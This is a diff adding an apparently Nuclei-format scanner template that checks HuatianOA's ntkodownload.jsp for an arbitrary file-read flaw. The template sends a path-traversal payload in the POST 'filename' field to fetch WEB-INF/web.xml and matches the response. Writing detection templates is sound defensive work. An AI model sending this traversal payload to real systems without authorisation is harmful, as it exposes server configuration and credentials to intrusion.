@@ -1,0 +1,27 @@
+id: huatianOA-ntkodownload-fileread
+
+info:
+  name: HuatianOA ntkodownload - Fileread
+  author: Co5mos
+  severity: critical
+  description: 检测华天OA系统ntkodownload.jsp存在的文件读取漏洞
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/OAapp/jsp/trace/ntkodownload.jsp"
+    
+    body: "filename=../../../Tomcat/webapps/OAapp/WEB-INF/web.xml"
+
+    matchers-condition: and
+    matchers:
+      - type: regex  # 修正为regex类型匹配器
+        part: body
+        regex:
+          - "java.util.HashMap"
+          - "oa@"
+        condition: or  # 两个正则表达式满足一个即可
+
+      - type: status
+        status:
+          - 200
